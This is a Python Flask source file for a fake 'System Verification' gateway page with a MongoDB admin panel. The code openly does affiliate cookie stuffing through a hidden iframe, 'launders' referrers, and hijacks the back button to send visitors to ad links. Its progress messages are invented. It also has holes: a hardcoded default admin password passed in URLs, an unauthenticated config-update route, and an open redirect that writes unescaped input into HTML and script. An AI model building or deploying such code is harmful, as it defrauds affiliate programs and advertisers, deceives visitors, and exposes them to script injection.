import os, re, json
from flask import Flask, render_template_string, request, redirect, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId

app = Flask(__name__)

# --- Configuration & Database ---
raw_uri = os.getenv("MONGO_URI", "").strip()
MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "mounir123")

client = MongoClient(MONGO_URI)
db = client['universal_gateway_db']
config_col = db['config']

def get_config():
    conf = config_col.find_one({"type": "main_config"})
    if not conf:
        default = {
            "type": "main_config", 
            "reward_url": "https://google.com", 
            "stuffing_url": "", 
            "exit_url": ""
        }
        config_col.insert_one(default)
        return default
    return conf

# --- Routes ---

@app.route('/')
def index():
    conf = get_config()
    return render_template_string(LANDING_HTML, **conf)

@app.route('/redirect')
def traffic_laundry():
    target_url = request.args.get('url')
    if not target_url: return redirect('/')
    # Professional Referrer Laundering (Removes Telegram from source)
    return f'''
    <html>
    <head>
        <meta name="referrer" content="no-referrer">
        <meta http-equiv="refresh" content="0;url={target_url}">
        <script>window.location.replace("{target_url}");</script>
    </head>
    <body style="background:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
        <div style="color:#666;">Loading secure link...</div>
    </body>
    </html>
    '''

@app.route('/admin')
def admin():
    if request.args.get('pw') != ADMIN_PASSWORD: return "Access Denied", 403
    return render_template_string(ADMIN_HTML, c=get_config(), pw=ADMIN_PASSWORD)

@app.route('/update_config', methods=['POST'])
def update_config():
    config_col.update_one({"type": "main_config"}, {"$set": {
        "reward_url": request.form['reward_url'],
        "stuffing_url": request.form['stuffing_url'],
        "exit_url": request.form['exit_url']
    }})
    return redirect(f"/admin?pw={ADMIN_PASSWORD}")

# --- UI Templates ---

LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .soft-shadow { box-shadow: 0 10px 25px -5px rgba(59, 130, 246, 0.1), 0 8px 10px -6px rgba(59, 130, 246, 0.1); }
    </style>
</head>
<body class="bg-slate-50 text-slate-800 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-white rounded-[2rem] p-8 soft-shadow border border-blue-50 text-center">
        <div class="w-20 h-20 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6 text-3xl">
            🛡️
        </div>
        <h1 class="text-2xl font-bold text-slate-900 mb-2">System Verification</h1>
        <p class="text-slate-500 text-sm mb-8">Please wait while we prepare your secure resource link...</p>

        <div id="loading_area">
            <div class="w-full bg-slate-100 h-2 rounded-full mb-4 overflow-hidden">
                <div id="bar" class="h-full bg-blue-500 transition-all duration-700 ease-out" style="width:0%"></div>
            </div>
            <p id="status_text" class="text-xs font-medium text-blue-500 uppercase tracking-wider">Initializing Connection...</p>
        </div>

        <div id="reward_area" class="hidden animate-in fade-in duration-500">
            <div class="bg-emerald-50 text-emerald-700 p-4 rounded-2xl mb-6 text-sm font-medium">
                Verification Successful! Your link is ready.
            </div>
            <a href="/redirect?url={{ reward_url|urlencode }}" 
               class="block w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-2xl font-bold transition-all shadow-lg shadow-blue-200">
                Access Content Now
            </a>
        </div>
    </div>

    <!-- Hidden Iframe for Background Cookie Stuffing -->
    {% if stuffing_url %}
    <iframe src="/redirect?url={{ stuffing_url|urlencode }}" style="display:none; width:0; height:0;"></iframe>
    {% endif %}

    <script>
        let progress = 0;
        const bar = document.getElementById('bar');
        const status = document.getElementById('status_text');
        const loadArea = document.getElementById('loading_area');
        const rewardArea = document.getElementById('reward_area');
        
        const messages = ["Analyzing request...", "Encrypting tunnel...", "Checking compatibility...", "Finalizing access..."];

        const interval = setInterval(() => {
            progress += 5;
            bar.style.width = progress + "%";
            if(progress % 25 === 0) {
                status.innerText = messages[Math.floor(progress/26)];
            }
            if(progress >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    loadArea.classList.add('hidden');
                    rewardArea.classList.remove('hidden');
                    status.innerText = "READY";
                }, 500);
            }
        }, 150);

        // Silent Back-Button Hijack (Redirects to Exit URL when user leaves)
        (function() {
            const exitUrl = "{{ exit_url }}";
            if(!exitUrl) return;
            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                location.href = "/redirect?url=" + encodeURIComponent(exitUrl);
            };
        })();
    </script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Control Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-100 p-6">
    <div class="max-w-xl mx-auto">
        <div class="bg-white p-8 rounded-[2rem] shadow-xl border border-slate-200">
            <h1 class="text-2xl font-bold text-slate-800 mb-8 flex items-center">
                <span class="mr-3">⚙️</span> Gateway Settings
            </h1>
            
            <form action="/update_config" method="POST" class="space-y-6">
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-2">1. Destination Link (What user wants)</label>
                    <input name="reward_url" value="{{ c.reward_url }}" placeholder="https://..." class="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition">
                </div>
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-2">2. Background URL (Affiliate Injection)</label>
                    <input name="stuffing_url" value="{{ c.stuffing_url }}" placeholder="AliExpress tracking link" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition">
                </div>
                <div>
                    <label class="block text-xs font-bold text-slate-400 uppercase mb-2">3. Exit URL (Direct Ad Link / Feed)</label>
                    <input name="exit_url" value="{{ c.exit_url }}" placeholder="Adsterra or Tonic link" class="w-full p-4 bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition">
                </div>
                <button class="w-full bg-blue-600 hover:bg-blue-700 text-white py-4 rounded-xl font-bold shadow-lg transition">
                    Save and Deploy 🚀
                </button>
            </form>
            
            <div class="mt-8 pt-8 border-t border-slate-100">
                <p class="text-[10px] text-slate-400 uppercase font-bold mb-2">Your Public Gateway URL:</p>
                <code class="block bg-slate-50 p-3 rounded-lg text-blue-600 text-xs break-all">{{ host_url }}</code>
            </div>
        </div>
    </div>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
